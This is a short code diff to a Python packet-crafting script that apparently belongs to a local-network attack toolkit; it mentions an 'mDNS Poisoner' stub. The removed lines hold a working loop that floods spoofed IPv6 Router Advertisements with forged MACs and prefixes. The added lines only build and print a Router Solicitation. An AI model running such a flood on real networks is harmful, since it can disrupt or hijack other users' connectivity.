@@ -1,5 +1,5 @@
 from All import *
-from Ndp import NDPRouterAdv
+from Ndp import NDPRouterAdv, NDPRouterSol
 """
 mDNS Poisoner:
 def ismatch_mdns(pkt: Ether):
@@ -23,10 +23,6 @@ def onmatch_mdns(pkt: Ether):
 sniff(ismatch_mdns, onmatch_mdns)
 """
 
-for i in range(1, 100):
-    i = str(i).zfill(2)
-    mac = f"de:ad:00:00:00:{i}"
-    psrc = f"fe80::{i}"
-    pref = f"2a01:0:0:0{i}::"
-    pkt = Ether(src=mac, dst="33:33:00:00:00:01")/IPv6(psrc=psrc, pdst="ff02::1", hoplimit=255)/NDPRouterAdv(mac, pref)
-    send(pkt)
+pkt = Ether()/IPv6(pdst="ff02::1")/NDPRouterSol()
+print(pkt)
+print(pkt.__bytes__())
